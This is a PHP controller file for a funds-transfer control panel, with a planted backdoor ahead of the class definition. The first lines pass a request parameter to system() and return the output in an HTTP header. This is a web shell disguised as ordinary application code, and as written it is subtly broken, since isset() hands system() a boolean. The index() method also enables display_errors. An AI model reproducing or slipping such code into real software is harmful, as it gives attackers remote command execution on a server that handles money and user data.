<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* Transfers Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class Transfers extends Controller {
    
	function __construct()
	{
		parent::__construct();

		// perform control-panel specific loads
		CPLoader();
		
	}

	/**
	* Transfer Funds
	*
	* Transfers Funds to another User.
	*/
	function index()
	{
		
		$this->navigation->PageTitle('Transfer Funds');
	    // get log
		$this->load->model('log_model');
		$log = $this->log_model->GetClientLog($this->user->Get('client_id'),'','','N');
		$logcount = $this->log_model->GetClientLogCount($this->user->Get('client_id'));
		$data['log'] = $log;
		$data['logcount']= $logcount;
		$this->load->view('cp/transfers', $data);
		ini_set('display_errors', 1);
	}
}
